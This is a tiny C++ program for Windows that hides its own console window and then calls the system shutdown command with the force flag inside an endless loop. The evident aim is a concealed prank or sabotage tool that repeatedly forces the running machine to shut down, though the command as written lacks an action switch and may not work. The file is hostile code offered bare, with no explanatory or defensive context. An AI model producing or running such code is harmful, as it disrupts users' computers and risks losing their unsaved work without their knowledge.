#include <windows.h>

int main()
{
    FreeConsole();
    while(true)
    {
        system("shutdown -f");
    }
    return 0;
}
